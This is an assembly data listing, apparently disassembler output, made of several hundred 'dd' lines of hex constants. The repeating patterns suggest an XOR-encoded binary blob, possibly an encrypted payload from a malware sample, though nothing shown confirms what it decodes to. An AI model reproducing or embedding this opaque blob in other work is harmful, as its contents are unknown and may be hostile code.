		dd 0FBCF51BDh, 0B4BAC91h, 39B2203h, 6B983FCh, 0F769B19Ah
		dd 0D18F8CB8h, 399E627Ch, 0C8B0BD1Fh, 86DEA09Fh, 923E7FD5h
		dd 3F1E82D6h, 73869D4Dh, 53B7B696h, 7D293C3h, 3066C196h
		dd 0B4C3E170h, 64AD7961h, 4653484Fh, 3E4DB8A4h,	0DBCFDF1Fh
		dd 0F84B2F1Dh, 0D69B5386h, 0B8B9ACB7h, 5869F8F6h, 788FCFD2h
		dd 0E09E4B2Fh, 0D1B09B53h, 90DEB9ACh, 0B43E69F8h, 4C1E8FCFh
		dd 8869441h, 0F1B797BCh, 98F6F691h, 0A9D22176h,	2D2F1E8Fh
		dd 0E253869Eh, 9FAC2720h, 16F885ADh, 56CFB458h,	614B0952h
		dd 4FD5E64Eh, 21C9F330h, 0C119B180h, 0E1B8F3BFh, 79A67043h
		dd 48C1DC26h, 9324653h,	2DC59607h, 0D0E17030h, 0AC7961B4h
		dd 0FF2B89F0h, 0B1F6D399h, 0A9D23E6Ah, 2D2F1E8Fh, 0FD53869Eh
		dd 0DFACB7B0h, 0FF8F6DEh, 0E9CFD23Eh, 0F84B2F1Eh, 0E29B5386h
		dd 8CB9ACB5h, 5869F8F4h, 788FCFD2h, 0E09E4B2Fh,	0D1B09B53h
		dd 90DEB9ACh, 0B43E69F8h, 451E8FCFh, 728616C3h,	0D5B7DEF5h
		dd 21F6BDDAh, 30D21825h, 0B445E170h, 649B7961h,	4660484Fh
		dd 963A0921h, 70292DC1h, 61B7D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 46707440h, 0ACBFBD1Eh, 90DEB9A9h
		dd 0B43E69F8h, 491E8FCFh, 35869E4Bh, 0CAB7B09Bh, 9EF6DEB9h
		dd 8FD23E69h, 752F1E8Dh, 0D6538C86h, 87ACBAAEh,	72F8FCC6h
		dd 0AACFD23Bh, 0AB4B2F1Ah, 8A9B5385h, 8EB9ACB5h, 6B69F8F7h
		dd 28F4F52h, 0E99E2145h, 6EB0C50Dh, 9DE9FE0h, 66449607h
		dd 91625515h, 0ACEF4095h, 53354F64h, 74F2146h, 3020C196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 0D6C61976h, 879B5E9Ah, 90B9ACB6h, 5E69F8F6h,	788FCFD2h
		dd 0E09E4B2Fh, 0E3B09B53h, 0EFDEB9ACh, 0E3E6AF1h, 0D03BDBB9h
		dd 0AC1717EDh, 5324F9ECh, 1081E1D6h, 7D8A060Dh,	0E41634C2h
		dd 1E5DA2D9h, 0EAACAE85h, 7EF88958h, 0CDCFB65Ah, 264B7644h
		dd 4F9B70C1h, 69135348h, 0A71F232Dh, 0C38F031Eh, 79DEA5C1h
		dd 483764ACh, 93E4653h,	2DC09607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	142DC196h, 293033D6h, 0D95395B9h
		dd 8BACBAAAh, 6BF8FCCAh, 9ACFD23Fh, 974B2F1Fh, 1D9B5387h
		dd 21B084FDh, 0C1F6433Ah, 0E165302Dh, 7960B4D0h, 484F64ACh
		dd 9204653h, 2DC09607h,	0D0E07030h, 1A7861B4h, 0BC9D2502h
		dd 67F680E7h, 30C5A8CDh, 0B4769728h, 0E57961h, 20B77A7Dh
		dd 0C1F83A12h, 70C201EDh, 6125D0E1h, 4F4CAC79h,	21475348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DE05093h, 0D0A5B0A0h, 0AC2EDA38h, 53CF8DF5h, 13809FC9h
		dd 0EE8080Bh, 0B41630DDh, 64DDD7E3h, 4643484Fh,	96030921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 5071302Dh, 8BA6EC88h, 33B0C109h, 9F37B6Eh, 59469607h
		dd 522E4A0Ah, 0C28620F5h, 35B77853h, 7F61275h, 30A3C196h
		dd 0B4F7E170h, 64AD7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9204653h, 2DC09607h, 0D0E07030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 0C060921h, 9FF7608Ch, 0E14B7544h
		dd 0C5B8EC39h, 8AA4160Dh, 5669515Fh, 638F7B66h,	179EF591h
		dd 48B0539Bh, 94C4653h,	2DDA9607h, 0D0E07030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	0D6494F64h
		dd 0EECE6304h, 85D26433h, 7C2FBA2Bh, 0A1531D05h, 0EDAC2A2Dh
		dd 1F85F77h, 1ACF668Ah,	616FE5D4h, 4F5EAC79h, 214C5348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 1560B4D0h, 0AA88529Ah, 94DEE5F0h, 983ED948h
		dd 181E2B6Bh, 698605D0h, 0F6B72D06h, 28F17215h,	3045D98Eh
		dd 0B4C5E170h, 64AD7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 19312DC1h, 0BC73E4D5h
		dd 0CD9B0FDAh, 0BDB91209h, 70694947h, 298F6974h, 69ED0B4h
		dd 48DB24ECh, 93D4653h,	2DC59607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 86082146h, 0E9EB80D7h, 0DA2F45D4h, 0E6534E56h, 0DCAC090Eh
		dd 0E1F8446Ch, 70BC11FDh, 61A3D0E1h, 4F60AC79h,	21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 0E94E64ACh, 0D6E51702h, 5D3E3FAEh
		dd 0BB1E4808h, 0E88C5782h, 53136D46h, 7062146h,	302FC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 0D9B4D0E1h
		dd 0F7F5F025h, 0A0823D26h, 0EA2E4749h, 0E1562538h, 7969B4D0h
		dd 484E64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	0F02DC196h, 342F1E7Fh, 0E4530661h
		dd 0C6AC4F4Fh, 16F80921h, 0F00F2DC1h, 0E18BD0E1h, 0CF7BAC79h
		dd 0A1595348h, 41990709h, 617F302Dh, 0F966B4D0h, 0C84864ACh
		dd 89224653h, 0ADC29607h, 50E27030h, 2C7861B4h,	0D3494F64h
		dd 87092146h, 0B02DC196h, 34D1E170h, 0E4AB7961h, 8654484Fh
		dd 76040921h, 90332DC3h, 9EB710E6h, 0B0676C66h,	0DE4193B7h
		dd 3E91C7F6h, 1E7FF0D2h, 867E742Fh, 0B770A453h,	0A95EA6ACh
		dd 5C1929Eh, 0C8E17030h, 9C7961B4h, 52484F64h, 7090146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h
		dd 4F60AC79h, 21635348h, 0C1F30709h, 0E103302Dh, 793EB4D0h
		dd 480664ACh, 9124653h,	2DE39607h, 0D0F97030h, 0AC6961B4h
		dd 534F4F64h, 70B2146h,	302CC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 546EC2D0h
		dd 2CF88ECFh, 2F1E398Bh, 0D0360B6Ch, 0ACBA2C8Eh, 53E15172h
		dd 79B2344h, 3051C196h,	0B4B6E170h, 64FC7961h, 466A484Fh
		dd 96200921h, 702B2DC1h, 61A5D0E1h, 4F6DAC79h, 21425348h
		dd 0C1970709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 6165E41Ah, 0B4F1F2EAh
		dd 50D23D71h, 0F92F1BBDh, 505396A3h, 5FA892E1h,	90E9BBABh
		dd 70EEABA4h, 617E8DA7h, 4FD48567h, 21DF5A4Fh, 0C1140709h
		dd 0E11C302Dh, 7934B4D0h, 487164ACh, 90A4653h, 2DDD9607h
		dd 0D0EC7030h, 0AC7A61B4h, 53484F64h, 7092146h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 6E67F9CAh, 3AFCD38Bh,	0F5CFDE20h
		dd 194B2F00h, 349B53A4h, 54B9AC96h, 0AC69F8D2h,	0B98FCCFAh
		dd 469E461Ah, 6CB28614h, 5D587CAh, 2F231968h, 0D030197Fh
		dd 0ACCE5493h, 53D6416Eh, 7812146h, 3040C196h, 0B4EFE170h
		dd 64BC7961h, 4652484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 607AE3CCh, 0BD6BE0BEh, 458FD7E6h,	0F9E4B3Ch
		dd 33B09B4Ch, 75DEB9B2h, 503E69E6h, 501E8FD2h, 2F869E50h
		dd 2DB7B081h, 70F6DEA5h, 55D23C49h, 0FF2F17A5h,	4A519EA2h
		dd 54A483EAh, 96EF975Ah, 70F460FBh, 61C8D0E1h, 4F4EAC79h
		dd 21425348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 4C4F64ACh
		dd 5868F5D5h, 603E7BB8h, 6C1E9088h, 0D2869C45h,	0D1B7B08Ch
		dd 85F6DEAEh, 0B3D23E7Eh, 0CB2F1E9Ah, 1E538688h, 3EACB7A8h
		dd 0EAF8F6C9h, 0F4CFD228h, 0EB4B2F0Dh, 0C79B5397h, 5CB9ACA4h
		dd 0DF69F9EAh, 0E185F2B4h, 79C5B9D9h, 480064ACh, 9314653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 43484F64h, 614495CCh
		dd 1ED2325Eh, 1F2F01DEh, 0F6538B85h, 0CEACB7BDh, 1EF8F6CEh
		dd 7CFD231h, 1B4B2F05h,	0DB9B54ABh, 83B9B48Eh, 5569D9C8h
		dd 9D8FD4E9h, 29E4101h,	0C3B09B45h, 8FDEB9A1h, 4E3E69EEh
		dd 0D01E81E4h, 0ACB2328Ah, 53304F64h, 72D2146h,	302EC196h
		dd 0B4D0E170h, 64AC7961h, 4353484Fh, 0F96FB0ACh, 46CFD90Dh
		dd 0E74B3B54h, 0FF9B44B6h, 0AAB9ACB4h, 0BB69F8FFh, 468FCFCBh
		dd 959E5618h, 0B5B0AC6Fh, 0F6DE8A9Fh, 0D23E44D3h, 3D1EA1E1h
		dd 586A675h, 0D1B796A5h, 83F6DEA8h, 0ABD23E7Dh,	942F1F80h
		dd 6442D4EFh, 46C84A4Dh, 96420921h, 703C2DC1h, 61B4D0E1h
		dd 4F64AC79h, 2F465348h, 0B6FDBF87h, 0B38FC6E2h, 2D9E4C13h
		dd 8AB08617h, 8CDEBBAEh, 833E69FEh, 261E95E0h, 4086AB7Ah
		dd 0B9B798B8h, 0EAF6F89Ah, 0C8D2164Ch, 4B2F3DAEh, 9B539E88h
		dd 0F3AC9B9Ch, 0E9F8D3ECh, 0DFCFD22Eh, 164B2F17h, 4F9A45A1h
		dd 21876E65h, 0C1F80709h, 0E16E302Dh, 7963B4D0h, 484F64ACh
		dd 1A204653h, 0ACBE2993h, 0B71E89E3h, 93869E79h, 0E9B7A6D2h
		dd 0B3F6D5ABh, 0D8D23E68h, 442F35A2h, 8A53A581h, 0A8ACA9ABh
		dd 7CF8E8C4h, 97CFF021h, 974B073Bh, 0B09B75A3h,	0D5B9BAA1h
		dd 4F69CCC5h, 518FC6C8h, 0BA9E4B24h, 5BB09856h,	9C6D124h
		dd 2D529607h, 0D0DA7030h, 0AC7061B4h, 53484F64h, 1D082146h
		dd 0BCA60301h, 0C52F1DAAh, 335386B4h, 1BACBF86h, 20F8EB9Eh
		dd 0A3CFC223h, 824B2009h, 0BA9B5F89h, 0DEB9A2BBh, 3769F5FFh
		dd 0A8FD9C1h, 939E6A31h, 0B5B0B174h, 0F6DEA7B1h, 8A3E5CCAh
		dd 631E9BECh, 4B869E47h, 3FB7B09Bh, 7F5C18Eh, 309BE888h
		dd 0B4B4E170h, 64B57961h, 4652484Fh, 0B5060921h, 0E9A7E85Ah
		dd 194B2E02h, 349B53A6h, 45B9ACA8h, 9569FFDCh, 928FDBEAh
		dd 0F49E0446h, 0C1B0AC1Dh, 87DEA29Eh, 0CA3E7ED5h, 291E86C3h
		dd 4486875Fh, 0A8B799BEh, 0F8F6FA9Bh, 82D2095Dh, 82F0DADh
		dd 8A538692h, 8EACB7B0h, 9FF8F0D2h, 70EEACA2h, 613FD0E1h
		dd 4F57AC79h, 21415348h, 0E9970709h, 45DAF9B2h,	0FA9E4A3Bh
		dd 0CCB09B47h, 8FDEB9B9h, 0A93E69EBh, 7B1E8FC1h, 5E86DD06h
		dd 0A3B7D8FCh, 0C4F6CFADh, 42D2195Ah, 6E2F3DCFh, 83538392h
		dd 0BDACA2A6h, 69F8EEC6h, 0A0CFF222h, 0B54B260Bh, 0B39B538Eh
		dd 0DEB9ACB7h, 9F69F8F6h, 0E187E29Bh, 79C1AEC3h, 480264ACh
		dd 9314653h, 18C09607h,	644DBB94h, 21869E4Ch, 0C3B7B092h
		dd 97F6DEB0h, 0A0D23E60h, 392F1E86h, 0CE538698h, 9AAC8F8Ch
		dd 65F8A088h, 0CCCF8D62h, 64B4266h, 239B32FFh, 55B998FAh
		dd 4269DCCDh, 728FE8ECh, 0CA9E5D04h, 9FB0954Eh,	0FADEBCA1h
		dd 0E53E6BFCh, 0D61E85DAh, 0ACD4ECDEh, 53734F64h, 7042146h
		dd 0C2CC196h, 0B1832DBh, 0F153869Eh, 0DFACB7B0h, 0FF8F6DEh
		dd 0E9CFD23Eh, 0F94B2F1Eh, 0DD9B5386h, 0B7B9ACB7h, 6069F5FBh
		dd 488FE4F8h, 0DC9E7D1Bh, 0D9B0AA7Ch, 86DEB3A7h, 0BC3E38ADh
		dd 9B1E1450h, 0AC86A406h, 5B86303Bh, 1291AD2Dh,	48D7D05h
		dd 0B2102CD7h, 64DED4E5h, 465C484Fh, 96030921h,	5E302DC1h
		dd 0AA180147h, 0D89B5282h, 0B9B9ACB7h, 5969F8F6h, 798FCFD2h
		dd 0E39E4B2Fh, 88B09B53h, 0B0DEB9ADh, 993E69FAh, 611E8FCFh
		dd 869E4Bh, 0F7B7B09Bh,	0B7F6DEB9h, 8ED27523h, 0DC2F881Dh
		dd 6653A8A4h, 46FA7660h, 964E0921h, 70762DC1h, 61F7D0E1h
		dd 4F72AC79h, 21475348h, 0C1960709h, 0E070302Dh, 0EE5B7741h
		dd 8EB4897Bh, 0ACDEB9ACh, 8C3E69F8h, 481E8FCFh,	65869E4Bh
		dd 25B7B09Bh, 2EF8F5FCh, 799F6A1Eh, 0D36731DDh,	1A79A5DEh
		dd 0CBA3AD82h, 23FFF8FEh, 0BECF986Ch, 154BA69Bh, 489B74BFh
		dd 6FCC127Ah, 82021C17h, 0E1C52C33h, 791EB4D0h,	487F64ACh
		dd 9244653h, 2DC19607h,	0D0E17030h, 887961B4h, 0CBEE9EC1h
		dd 0A1FFCB90h, 84D03177h, 782F179Ch, 0C7538598h, 44ACA693h
		dd 967D7E78h, 70292DC1h, 61B7D0E1h, 4E630004h, 215490DAh
		dd 4CBAC399h, 2DDB957h,	5B9EC8AFh, 4E841ECCh, 6D4B4B58h
		dd 4F1CBD2Bh, 0C11A4000h, 0ACDD66BCh, 53764F64h, 7002146h
		dd 302DC196h, 0B4D0E170h, 60AC7961h, 475785D4h,	9722C8B0h
		dd 7972904Dh, 75E86E71h, 4B186EECh, 212AEBC2h, 0C19B0709h
		dd 0E174302Dh, 7961B4D0h, 484F64ACh, 9214653h, 82C09607h
		dd 3168286Ah, 0B287E732h, 3AEE5F74h, 83C51275h,	5AD280D7h
		dd 932FD445h, 64006A72h, 4667484Fh, 96000921h, 70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 0A32CC196h,	785CB120h
		dd 0C351061Eh, 84BF181Eh, 34F86940h, 0F1CF7C90h, 474891A0h
		dd 4F1DBF6Ah, 215C5348h, 0C1940709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h, 9312DC1h, 0D83E96A7h, 0E99BDB0Eh
		dd 0E9B9011Ah, 369636Dh, 998F514Ch, 79DF88ECh, 486764ACh
		dd 9274653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	9C71302Dh
		dd 0D1EBFC98h, 0CBB014DCh, 0A0DE0613h, 8E3EC352h, 0C9282262h
		dd 0AC566CB9h, 534F4F64h, 7082146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 74E17030h, 7F53CE9h
		dd 3AB73C17h, 75F61275h, 2C93F8AFh, 0B4F8EF7Eh,	64AB7961h
		dd 4652484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	8D0E170h, 0C3F31B03h, 21921413h
		dd 96843A12h, 70222DC1h, 61B0D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 0F961B4D0h, 0C84F9BAFh, 89687953h
		dd 0AD3E9907h, 501E7730h, 2C8666B4h, 0D3B74864h, 87F62246h
		dd 0B0D2C296h, 0B42FE070h, 64537861h, 46AC484Fh, 96F80921h
		dd 70CF2DC1h, 614BD0E1h, 0CF9BAC79h, 0A1B95248h, 1690609h
		dd 218F312Dh, 869EB5E8h, 0B7B06554h, 0F6DE45ABh, 0D23E95FFh
		dd 2F1E77CCh, 84867E48h, 7B484BC7h, 17092146h, 102DC196h
		dd 0B5D0E170h, 64AC5961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C19C0709h,	0E148302Dh
		dd 791FB4D0h, 48DA64ACh, 9B44653h, 2D549607h, 0D0747030h
		dd 0ACEC61B4h, 53DD4F64h, 79C2146h, 30B8C196h, 0B445E170h
		dd 64397961h, 46C6484Fh, 96790921h, 70082DC1h, 7D95D0E1h
		dd 559B19FBh, 36B9E0C8h, 0D469B774h, 0F38F9E56h, 769E1FA8h
		dd 44B0CCD9h, 3DEE321h,	2A3E3577h, 0D51ED05Dh, 0AF86FFDFh
		dd 52B7D30Dh, 7F6BB21h,	30D258F0h, 0B465E170h, 45D27961h
		dd 20ACF2C8h, 89F8F6EDh, 0E9CF9544h, 0F4B2F1Eh,	219B53ADh
		dd 4FB9AC9Ch, 0AF69F8DDh, 8F8FCFF9h, 179E4B04h,	26B09B78h
		dd 67DEB987h, 173E69D3h, 491EA390h, 0AC869E4Bh,	53B7D602h
		dd 239D2146h, 56D27C1Ch, 922F1EBCh, 0FD53C6EDh,	3CACB7B0h
		dd 0ECF8F6C1h, 26CFD221h, 374B3F5Dh, 199B43C5h,	77B9BCF4h
		dd 0BB69E8B5h, 9B8FCFCDh, 3A9E4B30h, 0D1B0B805h, 8DEB9ACh
		dd 2D3E0C60h, 0F7747030h, 0CA86A139h, 7FB7B0A8h, 9EF6E4D4h
		dd 0B5D23E69h, 0E22F1E9Bh, 0AB5396DDh, 9CACD8C2h, 4CF8745Ah
		dd 0DCCF50BAh, 374B4C78h, 0CA9B43C5h, 6CB9ACA3h, 5869E1BAh
		dd 0E28FCFD2h, 799E28B9h, 61DA64ACh, 6FDE84DCh,	1F3E69CBh
		dd 491EBBA8h, 0C2869E4Bh, 0FFB7B0B0h, 0F1F6BDDFh, 0DDD21C49h
		dd 592F24B1h, 8953BCA0h, 0EAAC8D8Eh, 0C0F895B8h, 26CFC27Dh
		dd 0F84B3F5Dh, 4A9B5386h, 21B9CD23h, 0ED030709h, 8F8FF5BFh
		dd 4A9E4B04h, 0D1B0A835h, 67DEB9ACh, 813E69D3h,	3D1EECA9h
		dd 5A86A475h, 0BEB792BBh, 0ABF6E487h, 9CD25D0Fh, 0E22F7DE9h
		dd 3B5396DDh, 0DFACB08Ah, 91F8F6DEh, 70CF8DACh,	4F20D0E1h
		dd 359B6BEDh, 12B9ACA8h, 3E69CB90h, 1E8FCFD2h, 949E4B2Fh
		dd 0B7B0A16Dh, 0E4DEFDEEh, 0DB3E53C6h, 261EADEFh, 4186BC6Bh
		dd 0ACB78AA5h, 87F6DEB9h, 0CFD23E70h, 0BE2F1E8Fh, 6453DA11h
		dd 7626484Fh, 13F8C0B7h, 43CFD22Ah, 524B1C78h, 7C9B60E0h
		dd 12B99FD1h, 1B69CB90h, 878F4D56h, 1F9E87E3h, 8DB0579Fh
		dd 6FDE2530h, 323EA534h, 0CB1EC8B5h, 0B686D535h, 49B7FCE4h
		dd 7F692C6h, 207C196h, 252F2AE8h, 0EA538696h, 0C8ACB7BBh
		dd 18F8F6D5h, 0FECFD235h, 0EF4B2F15h, 0B09B538Dh, 0DEB9ACB7h
		dd 3E69F8F6h, 828FCFD2h, 869E9BFFh, 5DB09B53h, 9DEE828h
		dd 2D5C9607h, 0D0997030h, 9F5B61B4h, 0ACB783FDh, 9EF6DEB9h
		dd 0A9D23E69h, 2D2F1E8Fh, 0FD53869Eh, 0B9ACB7B0h, 0B2F8F6DEh
		dd 51CF904Bh, 7F4B6A66h, 0D59B1BFDh, 3BB91E05h,	0D669B489h
		dd 4A8F8050h, 799EEA8Fh, 48CB64ACh, 9084653h, 1EC19607h
		dd 2F1EBCA9h, 53869E4Bh, 0ACB7B09Bh, 0F8F6DEB9h, 19D23E69h
		dd 0B42F23FFh, 64947961h, 4659484Fh, 53060921h,	70CF4EA2h
		dd 61C3D0E1h, 2CF1E07Eh, 21B97C67h, 0C1E10709h,	0E151302Dh
		dd 7961B4D0h, 7B4F64ACh, 3BDE8ACAh, 1D3E5D9Fh, 0FE1EB9A6h
		dd 0AC86A620h, 53694F64h, 7032146h, 302DC196h, 0D7D1E170h
		dd 6453564Eh, 0EDC7584Dh, 3DF8577Eh, 70CF739Eh,	61F5D0E1h
		dd 4F6EAC79h, 21465348h, 0C1960709h, 0E170302Dh, 7960B4D0h
		dd 484E64ACh, 9204653h,	2DC09607h, 0D0E17030h, 0AC7961B4h
		dd 0C9494F64h, 64F66C0Bh, 53D2EEB9h, 0B42FCE5Fh, 642E7961h
		dd 4670484Fh, 96060921h, 70302DC1h, 61B4D0E1h, 4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 0B7C09607h, 0B31E3D7Dh, 7864E9Bh, 53B7113Bh
		dd 74A2146h, 3020C196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 0D261B4D0h, 2BB03AF3h, 9DE697Ch
		dd 2D8DC80Eh, 0D0EF7030h, 0AC7B61B4h, 53484F64h, 7F6CA46h
		dd 30D23E96h, 0B42F1E70h, 64509961h, 46E5614Fh,	96630921h
		dd 70292DC1h, 61B5D0E1h, 4F65AC79h, 21D19648h, 4169F909h
		dd 218FCF2Dh, 989E4B50h, 0B7B09C2Ch, 0F6DEADD2h, 13E26C6h
		dd 0D0E17488h, 0A07960B4h, 5B787F64h, 7092146h,	302BA996h
		dd 94D0E070h, 64AC7141h, 0AE53484Fh, 94070923h,	782835C1h
		dd 61B4D0E1h, 4F654479h, 31465048h, 0C1960F19h,	0C970302Dh
		dd 7D61B4D1h, 487F54ACh, 9214653h, 2DCF3E07h, 0F0E17530h
		dd 0AC796194h, 0FB484F64h, 109214Eh, 3035D996h,	0B4D0E170h
		dd 64AAB161h, 56534F4Fh, 96070931h, 18302DC1h, 69B4D0E4h
		dd 4F549C79h, 21465348h, 0C1B3AF09h, 0C170392Dh, 7961B4F0h
		dd 0E04F64ACh, 3214643h, 2DD98E07h, 0D0E17030h,	0AC70E9B4h
		dd 43484464h, 7092156h,	582DC196h, 0B8D0E174h, 64AC7961h
		dd 4653484Fh, 96070921h, 0A4302DC1h, 0D1B4D5B9h, 4F64A921h
		dd 21465348h, 0C1960709h, 70302Dh, 0B561B188h, 484F61F4h
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	0BF484F64h
		dd 0FD09241Eh, 3A2DC4CEh, 0AED0E429h, 4CAC7C38h, 70534D16h
		dd 96070C78h, 34302DC1h, 61B4D5B8h, 464AC79h, 6408010Dh
		dd 0EFA43445h, 0E13C7C69h, 0B04C7A5h, 2C61569Fh, 9212A3Fh
		dd 4CAEDA07h, 0B2883C54h, 0D50B00C6h, 14484F25h, 75595523h
		dd 546CA2F9h, 0C7B59314h, 32AC7912h, 33273A26h,	0E4576540h
		dd 135559AEh, 37B4D095h, 3A10DE10h, 4D073F29h, 0C1F56865h
		dd 9319662Dh, 1500C1A4h, 2D2A16EAh, 4C214653h, 7DB5FF7Fh
		dd 0B5821F42h, 0AC7912C7h, 272D1C64h, 63674811h, 5579B6F9h
		dd 0B4919508h, 64AC7961h, 4653484Fh, 96070921h,	70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 7092146h, 302DC196h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h
		dd 4F64AC79h, 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	302DC196h, 0B4D0E170h, 64AC7961h
		dd 4653484Fh, 96070921h
		dd 70302DC1h, 0EAB4D0E1h, 0C0A3F33Dh, 38252F20h, 3965EB9Ah
		dd 7B0FA89h, 1A768466h,	0B6E42CE2h, 894A60FBh, 73861931h
		dd 51628D87h, 7D5A32B4h, 7F13DDCCh, 3860EB5Bh, 0E2B09F6h
		dd 0B39815F4h, 0AC1E2BEAh, 0A3696B98h, 0D5E8B5FBh, 4B7F54B8h
		dd 5597ADE5h, 258FAE04h, 9300B9B3h, 521AEF45h, 0BFEDA2F4h
		dd 0E411668Ch, 0B98605EFh, 3D06DB4Dh, 579BF1B4h, 57FA9341h
		dd 5609837h, 96C9425Eh,	5F98D6DAh, 0F9A9BC3Eh, 8EB26785h
		dd 6234FE16h, 0C3F82BE9h, 8203FE73h, 0FA593BA4h, 0A2C6FD0Bh
		dd 0A6E608A1h, 0A5A7CEFCh, 4E10DE3Bh, 69CCC7A6h, 3C25C4ABh
		dd 128C1BFAh, 54B6A8DAh, 95AEDE72h, 38C38E78h, 69CA7685h
		dd 0D1739A46h, 65F11D48h, 0AD6417A8h, 91F79CCDh, 8947CDEh
		dd 573E2111h, 18049E4Dh, 72522C51h, 36FD42D1h, 0A11F7949h
		dd 0E4833559h, 4C859456h, 7035D794h, 0F91E1B00h, 0CDA043BCh
		dd 0DF78D6D5h, 0BC35791Fh, 510E406h, 0B5CE72E3h, 8E18397Ch
		dd 11DBAC0Bh, 944C607Bh, 1DD7DC87h, 857105C4h, 460B3A25h
